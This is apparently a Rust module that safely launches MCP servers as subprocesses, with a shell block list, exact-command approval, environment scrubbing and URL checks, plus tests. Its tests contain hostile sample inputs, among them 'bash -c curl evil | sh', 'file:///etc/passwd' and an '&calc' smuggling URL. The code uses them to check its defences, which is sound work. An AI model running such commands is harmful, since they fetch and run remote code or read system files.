//! MCP servers on stdio (plan W7.18, W10.C1), per the 2026-07-28 stdio binding:
//! the client launches the server as a subprocess, writes one JSON-RPC message
//! per line to its stdin, reads one per line from its stdout, and may capture
//! its stderr (logs only; protocol logging is deprecated). To stop it, the
//! client closes stdin, waits, and then kills it.
//!
//! What this crate decides, so the Tauri glue (src-tauri/src/mcp_stdio.rs) only
//! wires it:
//! - **Which commands may run.** Only a command the user approved in a native
//!   dialog (the WebView cannot approve one itself) and that passes `validate`:
//!   no shell (a shell runs anything), no `npx -y` (it downloads and runs a
//!   package), no control characters, bounded sizes. An approval is for the
//!   exact command, arguments and folder (`Spec::canonical`).
//! - **The process.** A clean environment (PATH, HOME and the few variables a
//!   program needs to start; never the app's secrets), its own folder, stdin,
//!   stdout and stderr piped. Lines over the limit are dropped with a note.
//! - **Shutdown.** Close stdin, wait for the grace period, then kill.
//! - **Opening a URL** in the system browser (elicitation URL mode): only
//!   http and https, so the client and the model never see the page.

use std::io::{BufRead, BufReader, Read, Write};
use std::process::{Child, ChildStdin, Command, Stdio};
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::{Duration, Instant};

/// Longest stdout line (one JSON-RPC message) we accept.
pub const MAX_LINE: usize = 4 * 1024 * 1024;
/// Longest stderr line kept (the rest is cut).
pub const MAX_ERR_LINE: usize = 8 * 1024;
pub const MAX_ARGS: usize = 64;
pub const MAX_FIELD: usize = 4096;

/// Programs that would run whatever their arguments say.
const SHELLS: &[&str] = &["sh", "bash", "zsh", "dash", "fish", "ksh", "csh", "tcsh", "cmd", "cmd.exe", "powershell", "powershell.exe", "pwsh", "pwsh.exe", "env"];

#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Spec {
    pub command: String,
    pub args: Vec<String>,
    pub cwd: Option<String>,
}

fn base_name(cmd: &str) -> String {
    cmd.rsplit(|c| c == '/' || c == '\\').next().unwrap_or(cmd).to_ascii_lowercase()
}

fn has_control(s: &str) -> bool {
    s.chars().any(|c| c.is_control())
}

impl Spec {
    /// Why this command may not run at all (even approved), or Ok.
    pub fn validate(&self) -> Result<(), String> {
        if self.command.trim().is_empty() {
            return Err("no command".into());
        }
        if self.command != self.command.trim() {
            return Err("the command has spaces around it".into());
        }
        if self.args.len() > MAX_ARGS {
            return Err(format!("more than {MAX_ARGS} arguments"));
        }
        let fields = std::iter::once(&self.command).chain(self.args.iter()).chain(self.cwd.iter());
        for f in fields {
            if f.len() > MAX_FIELD {
                return Err(format!("a field is longer than {MAX_FIELD} bytes"));
            }
            if has_control(f) {
                return Err("a field has a control character (a new line, a NUL)".into());
            }
        }
        let name = base_name(&self.command);
        if SHELLS.contains(&name.as_str()) {
            return Err(format!("\"{name}\" is a shell or launcher: it would run anything; name the server's own program"));
        }
        if (name == "npx" || name == "npx.cmd" || name == "pnpx" || name == "bunx") && self.args.iter().any(|a| a == "-y" || a == "--yes") {
            return Err("npx -y downloads and runs a package without asking: install the server first and name its program".into());
        }
        if let Some(cwd) = &self.cwd {
            if cwd.trim().is_empty() {
                return Err("the folder is empty".into());
            }
        }
        Ok(())
    }

    /// One line that names exactly this command, its arguments and folder.
    /// Two specs approve each other only when this is equal.
    pub fn canonical(&self) -> String {
        let mut out = String::from("[");
        out.push_str(&quote(&self.command));
        for a in &self.args {
            out.push(',');
            out.push_str(&quote(a));
        }
        out.push_str("]@");
        out.push_str(&self.cwd.as_deref().map(quote).unwrap_or_else(|| "null".into()));
        out
    }
}

/// JSON string quoting (so the canonical line is one line, whatever the field holds).
fn quote(s: &str) -> String {
    let mut out = String::with_capacity(s.len() + 2);
    out.push('"');
    for c in s.chars() {
        match c {
            '"' => out.push_str("\\\""),
            '\\' => out.push_str("\\\\"),
            '\n' => out.push_str("\\n"),
            '\r' => out.push_str("\\r"),
            c if (c as u32) < 0x20 => out.push_str(&format!("\\u{:04x}", c as u32)),
            c => out.push(c),
        }
    }
    out.push('"');
    out
}

/// The commands the user approved, one canonical line each (the file the glue keeps).
#[derive(Default, Debug, Clone)]
pub struct Approved {
    lines: Vec<String>,
}

impl Approved {
    pub fn parse(text: &str) -> Self {
        let mut lines: Vec<String> = Vec::new();
        for l in text.lines() {
            let l = l.trim_end_matches('\r');
            if l.starts_with('[') && !lines.iter().any(|x| x == l) {
                lines.push(l.to_string());
            }
        }
        Approved { lines }
    }
    pub fn serialize(&self) -> String {
        let mut s = self.lines.join("\n");
        if !s.is_empty() {
            s.push('\n');
        }
        s
    }
    pub fn contains(&self, spec: &Spec) -> bool {
        let c = spec.canonical();
        self.lines.iter().any(|l| *l == c)
    }
    pub fn add(&mut self, spec: &Spec) {
        if !self.contains(spec) {
            self.lines.push(spec.canonical());
        }
    }
    pub fn remove(&mut self, spec: &Spec) -> bool {
        let c = spec.canonical();
        let before = self.lines.len();
        self.lines.retain(|l| *l != c);
        before != self.lines.len()
    }
    pub fn len(&self) -> usize {
        self.lines.len()
    }
    pub fn is_empty(&self) -> bool {
        self.lines.is_empty()
    }
}

/// Spawn is allowed only for a valid, approved spec.
pub fn may_spawn(spec: &Spec, approved: &Approved) -> Result<(), String> {
    spec.validate()?;
    if !approved.contains(spec) {
        return Err("not approved: Lumen runs a server's command only after you approve it".into());
    }
    Ok(())
}

/// What the program gets from the app's environment: enough to start, nothing secret.
pub const KEPT_ENV: &[&str] = &["PATH", "HOME", "USERPROFILE", "APPDATA", "LOCALAPPDATA", "SystemRoot", "TEMP", "TMP", "TMPDIR", "LANG", "LC_ALL"];

pub fn clean_env(from: impl Iterator<Item = (String, String)>) -> Vec<(String, String)> {
    from.filter(|(k, _)| KEPT_ENV.contains(&k.as_str())).collect()
}

/// The command that opens `url` in the system browser, for `os` ("macos", "linux", "windows").
pub fn open_url_command(url: &str, os: &str) -> Result<(String, Vec<String>), String> {
    let lower = url.to_ascii_lowercase();
    if !(lower.starts_with("https://") || lower.starts_with("http://")) {
        return Err("only http and https addresses open".into());
    }
    if url.len() > 8192 || url.chars().any(|c| c.is_whitespace() || c.is_control() || c == '"') {
        return Err("the address has spaces, quotes or control characters".into());
    }
    match os {
        "macos" => Ok(("open".into(), vec![url.into()])),
        // FileProtocolHandler takes the address as one argument: no shell parses it (unlike `cmd /c start`).
        "windows" => Ok(("rundll32".into(), vec!["url.dll,FileProtocolHandler".into(), url.into()])),
        _ => Ok(("xdg-open".into(), vec![url.into()])),
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Event {
    /// One line of stdout: a JSON-RPC message (the client parses it).
    Out(String),
    /// One line of stderr: a log line.
    Err(String),
    /// The process ended (its exit code when it has one).
    Exit(Option<i32>),
}

pub struct Session {
    child: Arc<Mutex<Child>>,
    stdin: Option<ChildStdin>,
}

fn read_lines<R: Read>(r: R, max: usize, cut: bool, mut emit: impl FnMut(String)) {
    let mut reader = BufReader::new(r);
    let mut buf: Vec<u8> = Vec::new();
    loop {
        buf.clear();
        // Read one line, but never hold more than `max` bytes of it.
        let mut too_long = false;
        loop {
            let chunk = match reader.fill_buf() {
                Ok(c) => c,
                Err(_) => return,
            };
            if chunk.is_empty() {
                if buf.is_empty() && !too_long {
                    return;
                }
                break;
            }
            let (part, done) = match chunk.iter().position(|b| *b == b'\n') {
                Some(i) => (&chunk[..i], Some(i + 1)),
                None => (chunk, None),
            };
            if !too_long {
                let room = max.saturating_sub(buf.len());
                if part.len() > room {
                    buf.extend_from_slice(&part[..room]);
                    too_long = true;
                } else {
                    buf.extend_from_slice(part);
                }
            }
            let used = done.unwrap_or(chunk.len());
            reader.consume(used);
            if done.is_some() {
                break;
            }
        }
        let line = String::from_utf8_lossy(&buf).trim_end_matches('\r').to_string();
        if too_long && !cut {
            emit(format!("\u{0}line longer than {max} bytes dropped"));
        } else {
            emit(line);
        }
    }
}

/// Start `spec` (the caller checked `may_spawn`). Events arrive on other threads.
pub fn spawn(spec: &Spec, env: Vec<(String, String)>, on_event: impl Fn(Event) + Send + Sync + 'static) -> Result<Session, String> {
    let mut cmd = Command::new(&spec.command);
    cmd.args(&spec.args).env_clear().envs(env).stdin(Stdio::piped()).stdout(Stdio::piped()).stderr(Stdio::piped());
    if let Some(cwd) = &spec.cwd {
        cmd.current_dir(cwd);
    }
    let mut child = cmd.spawn().map_err(|e| format!("could not start {}: {e}", spec.command))?;
    let stdin = child.stdin.take();
    let stdout = child.stdout.take().ok_or("no stdout")?;
    let stderr = child.stderr.take().ok_or("no stderr")?;
    let child = Arc::new(Mutex::new(child));
    let on_event = Arc::new(on_event);
    {
        let ev = on_event.clone();
        thread::spawn(move || read_lines(stderr, MAX_ERR_LINE, true, |l| ev(Event::Err(l))));
    }
    {
        let ev = on_event.clone();
        let child = child.clone();
        thread::spawn(move || {
            read_lines(stdout, MAX_LINE, false, |l| {
                if let Some(note) = l.strip_prefix('\u{0}') {
                    ev(Event::Err(note.to_string()));
                } else if !l.is_empty() {
                    ev(Event::Out(l));
                }
            });
            // stdout closed: the process is ending. Wait a little for its code.
            let until = Instant::now() + Duration::from_secs(2);
            let mut code = None;
            while Instant::now() < until {
                if let Ok(mut c) = child.lock() {
                    if let Ok(Some(s)) = c.try_wait() {
                        code = s.code();
                        break;
                    }
                }
                thread::sleep(Duration::from_millis(20));
            }
            ev(Event::Exit(code));
        });
    }
    Ok(Session { child, stdin })
}

impl Session {
    /// Write one JSON-RPC message. A message is one line (spec: messages MUST NOT contain embedded newlines).
    pub fn write_line(&mut self, line: &str) -> Result<(), String> {
        if line.contains('\n') || line.contains('\r') {
            return Err("a message must be one line".into());
        }
        if line.len() > MAX_LINE {
            return Err("the message is too long".into());
        }
        let w = self.stdin.as_mut().ok_or("the server's input is closed")?;
        w.write_all(line.as_bytes()).and_then(|_| w.write_all(b"\n")).and_then(|_| w.flush()).map_err(|e| format!("the server stopped reading: {e}"))
    }

    /// Close stdin, wait up to `grace`, then kill. Returns the exit code when there is one.
    pub fn close(&mut self, grace: Duration) -> Option<i32> {
        self.stdin = None;
        let until = Instant::now() + grace;
        loop {
            if let Ok(mut c) = self.child.lock() {
                match c.try_wait() {
                    Ok(Some(s)) => return s.code(),
                    Ok(None) if Instant::now() >= until => {
                        let _ = c.kill();
                        return c.wait().ok().and_then(|s| s.code());
                    }
                    Ok(None) => {}
                    Err(_) => return None,
                }
            }
            thread::sleep(Duration::from_millis(20));
        }
    }

    pub fn running(&self) -> bool {
        self.child.lock().map(|mut c| matches!(c.try_wait(), Ok(None))).unwrap_or(false)
    }
}

impl Drop for Session {
    fn drop(&mut self) {
        if self.running() {
            self.close(Duration::from_millis(200));
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::sync::mpsc;

    fn spec(cmd: &str, args: &[&str]) -> Spec {
        Spec { command: cmd.into(), args: args.iter().map(|s| s.to_string()).collect(), cwd: None }
    }

    #[test]
    fn shells_launchers_and_npx_yes_never_run() {
        for s in ["sh", "/bin/bash", "C:\\Windows\\System32\\cmd.exe", "pwsh", "/usr/bin/env"] {
            assert!(spec(s, &["-c", "x"]).validate().is_err(), "{s}");
        }
        assert!(spec("npx", &["-y", "@modelcontextprotocol/server-everything"]).validate().is_err());
        assert!(spec("npx", &["--yes", "x"]).validate().is_err());
        assert!(spec("mcp-server-filesystem", &["/home/u/notes"]).validate().is_ok());
        assert!(spec("python3", &["-I", "-m", "mcp_server.server"]).validate().is_ok());
    }

    #[test]
    fn control_characters_and_sizes_are_refused() {
        assert!(spec("node", &["a\nb"]).validate().is_err());
        assert!(spec("no\u{0}de", &[]).validate().is_err());
        assert!(spec(" node", &[]).validate().is_err());
        assert!(spec("", &[]).validate().is_err());
        let many: Vec<String> = (0..65).map(|i| i.to_string()).collect();
        let s = Spec { command: "node".into(), args: many, cwd: None };
        assert!(s.validate().is_err());
        assert!(spec("node", &[&"x".repeat(MAX_FIELD + 1)]).validate().is_err());
    }

    #[test]
    fn an_approval_is_for_the_exact_command_arguments_and_folder() {
        let a = spec("mcp-server-filesystem", &["/home/u/notes"]);
        let mut ok = Approved::default();
        assert!(may_spawn(&a, &ok).is_err(), "nothing runs before approval");
        ok.add(&a);
        assert!(may_spawn(&a, &ok).is_ok());
        assert!(may_spawn(&spec("mcp-server-filesystem", &["/"]), &ok).is_err(), "other arguments");
        assert!(may_spawn(&spec("mcp-server-filesystem", &["/home/u/notes", "/etc"]), &ok).is_err(), "an extra argument");
        let mut b = a.clone();
        b.cwd = Some("/tmp".into());
        assert!(may_spawn(&b, &ok).is_err(), "another folder");
        // ["a b"] and ["a","b"] differ.
        assert_ne!(spec("x", &["a b"]).canonical(), spec("x", &["a", "b"]).canonical());
        assert_ne!(spec("x", &["a\",\"b"]).canonical(), spec("x", &["a", "b"]).canonical());
        // Persisted and read back.
        let back = Approved::parse(&ok.serialize());
        assert!(back.contains(&a));
        assert_eq!(back.len(), 1);
        let mut back = back;
        assert!(back.remove(&a));
        assert!(may_spawn(&a, &back).is_err(), "revoked");
    }

    #[test]
    fn a_valid_but_dangerous_spec_is_refused_even_when_listed() {
        let bad = spec("bash", &["-c", "curl evil | sh"]);
        let mut ok = Approved::default();
        ok.add(&bad);
        assert!(may_spawn(&bad, &ok).is_err());
    }

    #[test]
    fn the_environment_keeps_only_what_a_program_needs() {
        let env = vec![("PATH".to_string(), "/usr/bin".to_string()), ("OPENAI_API_KEY".to_string(), "sk-x".to_string()), ("HOME".to_string(), "/home/u".to_string()), ("AWS_SECRET_ACCESS_KEY".into(), "y".into())];
        let kept = clean_env(env.into_iter());
        assert_eq!(kept, vec![("PATH".to_string(), "/usr/bin".to_string()), ("HOME".to_string(), "/home/u".to_string())]);
    }

    #[test]
    fn urls_open_only_over_http_with_no_shell() {
        assert_eq!(open_url_command("https://example.com/a?b=1", "linux").unwrap(), ("xdg-open".to_string(), vec!["https://example.com/a?b=1".to_string()]));
        assert_eq!(open_url_command("https://x.org", "macos").unwrap().0, "open");
        assert_eq!(open_url_command("https://x.org/&calc", "windows").unwrap().1, vec!["url.dll,FileProtocolHandler".to_string(), "https://x.org/&calc".to_string()]);
        for bad in ["javascript:alert(1)", "file:///etc/passwd", "https://x.org/ a", "https://x.org/\n", "ftp://x.org", "https://x.org/\"x"] {
            assert!(open_url_command(bad, "linux").is_err(), "{bad}");
        }
    }

    #[cfg(unix)]
    #[test]
    fn a_real_process_lines_in_lines_out_stderr_and_exit() {
        let (tx, rx) = mpsc::channel();
        let tx = Mutex::new(tx);
        let mut s = spawn(&spec("cat", &[]), clean_env(std::env::vars()), move |e| {
            let _ = tx.lock().unwrap().send(e);
        })
        .unwrap();
        s.write_line(r#"{"jsonrpc":"2.0","id":1,"method":"server/discover"}"#).unwrap();
        assert_eq!(rx.recv_timeout(Duration::from_secs(5)).unwrap(), Event::Out(r#"{"jsonrpc":"2.0","id":1,"method":"server/discover"}"#.into()));
        assert!(s.write_line("two\nlines").is_err());
        // Closing stdin ends cat by itself.
        let code = s.close(Duration::from_secs(5));
        assert_eq!(code, Some(0));
        let mut saw_exit = false;
        while let Ok(e) = rx.recv_timeout(Duration::from_secs(5)) {
            if let Event::Exit(_) = e {
                saw_exit = true;
                break;
            }
        }
        assert!(saw_exit);
    }

    #[cfg(unix)]
    #[test]
    fn stderr_is_a_log_and_a_server_that_ignores_stdin_is_killed_after_the_grace() {
        let (tx, rx) = mpsc::channel();
        let tx = Mutex::new(tx);
        // `sh` is refused by validate(); spawn() itself is what the glue calls after may_spawn.
        let mut s = spawn(&spec("sh", &["-c", "echo started >&2; exec sleep 30"]), clean_env(std::env::vars()), move |e| {
            let _ = tx.lock().unwrap().send(e);
        })
        .unwrap();
        assert_eq!(rx.recv_timeout(Duration::from_secs(5)).unwrap(), Event::Err("started".into()));
        let t = Instant::now();
        s.close(Duration::from_millis(300));
        assert!(t.elapsed() < Duration::from_secs(5));
        assert!(!s.running());
    }

    #[test]
    fn long_lines_are_dropped_on_stdout_and_cut_on_stderr() {
        let big = format!("{}\nok\n", "x".repeat(100));
        let mut got = Vec::new();
        read_lines(big.as_bytes(), 10, false, |l| got.push(l));
        assert_eq!(got.len(), 2);
        assert!(got[0].starts_with('\u{0}'));
        assert_eq!(got[1], "ok");
        let mut cut = Vec::new();
        read_lines(big.as_bytes(), 10, true, |l| cut.push(l));
        assert_eq!(cut, vec!["x".repeat(10), "ok".to_string()]);
    }
}
